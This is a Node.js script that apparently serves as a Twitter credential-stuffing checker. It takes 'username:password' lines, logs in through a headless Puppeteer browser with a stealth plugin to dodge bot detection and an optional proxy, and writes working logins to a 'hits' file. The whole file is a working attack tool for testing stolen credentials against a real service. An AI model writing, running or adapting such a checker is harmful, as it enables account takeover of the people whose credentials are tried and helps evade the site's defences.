require('dotenv').config()
const puppeteer = require('puppeteer-extra')
const {executablePath} = require('puppeteer')
const fs        = require('fs')

// add stealth plugin and use defaults (all evasion techniques)
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin());

const USE_PROXY      = process.env.USE_PROXY
const TWT_LOGIN      = process.env.TWT_LOGIN
const TWT_HOME       = process.env.TWT_HOME
const TWT_CHALLENGE  = process.env.TWT_CHALLENGE
const USR_TAG        = process.env.USR_TAG
const NEXT_TAG       = process.env.NEXT_TAG
const PSW_TAG        = process.env.PSW_TAG
const LGN_TAG        = process.env.LGN_TAG
const OUT_FILE       = process.env.OUT_FILE
const FAIL_FILE      = process.env.FAIL_FILE
const DELAY_TIME     = process.env.DELAY_TIME;

function delay (time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
};

exports.processLine = async function ({line, lap}){
    lap++

    const start = new Date();
    let errorTail = ``

    let usr = {
        userName: '',
        password: ''
    }
    let spl = line.split(':')

    usr.userName = spl[0]
    usr.password = spl[1]
    
    console.log(`Resolver start function - Account: ${usr.userName}`)

    // open our lovely browser
    const browser = await puppeteer.launch({
        headless: true,
        slowMo: 250,
        args: [USE_PROXY ? `--proxy-server=http=${USE_PROXY}` : '',
                '--autoplay-policy=user-gesture-required',
                '--disable-background-networking',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-breakpad',
                '--disable-client-side-phishing-detection',
                '--disable-component-update',
                '--disable-default-apps',
                '--disable-dev-shm-usage',
                '--fast-launch',
                '--single-process',
                '--disable-domain-reliability',
                '--disable-extensions',
                '--disable-features=AudioServiceOutOfProcess',
                '--disable-hang-monitor',
                '--disable-ipc-flooding-protection',
                '--disable-notifications',
                '--disable-offer-store-unmasked-wallet-cards',
                '--disable-popup-blocking',
                '--disable-print-preview',
                '--disable-prompt-on-repost',
                '--disable-renderer-backgrounding',
                '--disable-setuid-sandbox',
                '--disable-speech-api',
                '--disable-sync',
                '--hide-scrollbars',
                '--ignore-gpu-blacklist',
                '--metrics-recording-only',
                '--mute-audio',
                '--no-default-browser-check',
                '--no-first-run',
                '--no-pings',
                '--no-sandbox',
                '--no-zygote',
                '--password-store=basic',
                '--use-gl=swiftshader',
                '--use-mock-keychain'
        ],
        executablePath: executablePath()
    });

    try {
        
        const page = await browser.newPage();
        await page.setViewport({ width: 1024, height: 800 });
        await page.setRequestInterception(true);
        await page.setCacheEnabled(true);

        // Remove inecesary data
        page.on('request', (req) => {
            if(req.resourceType() == 'stylesheet' || req.resourceType() == 'font' || req.resourceType() == 'image'){
                req.abort();
            }
            else {
                req.continue();
            }
        });

        // open twitter
        await page.goto(TWT_LOGIN, {waitUntil: 'networkidle2'})
        await delay(DELAY_TIME)
        // Focus and fast send characters - username
        await page.focus(USR_TAG)
        await page.keyboard.sendCharacter(usr.userName)
        // Next step of flow
        await page.click(NEXT_TAG)
        await delay(DELAY_TIME)
        // Focus and fast send characters - password
        await page.focus(PSW_TAG)
        await page.keyboard.sendCharacter(usr.password)
        await delay(DELAY_TIME)
        // Login action
        await page.click(LGN_TAG)
        await delay(DELAY_TIME)
        // Check url if it's OK or not
        const url = await page.evaluate(() => document.location.href);
        // Success
        if(url == TWT_HOME || url == TWT_CHALLENGE){
            // Save hit
            fs.appendFileSync(OUT_FILE, `${line}:${usr.userName}\n`);
        } else if (url == TWT_LOGIN){
            // Fail accounts
            fs.appendFileSync(FAIL_FILE, `${line}:${usr.userName}\n`);
        }
        // To-Do add verified accounts check
        console.log(`Account: ${usr.userName} - Checked success`)
        // Each line in input.txt will be successively available here as `line`.
    } catch (e){
        errorTail += `Error: ${e} - In account: ${usr.userName}\n`
        // All Fail - :cry_cat:
        fs.appendFileSync(FAIL_FILE, `${line}:${usr.userName}\n`);
    }

    const end = new Date()

    // Close browser - we do not waste our ram
    await browser.close();
    
    return new Promise(resolve => {
        setTimeout(() => {
            resolve({
                end: `Lap time estimated finish ${end - start} ms`,
                tail: errorTail
            })
        }, 10)
    })
}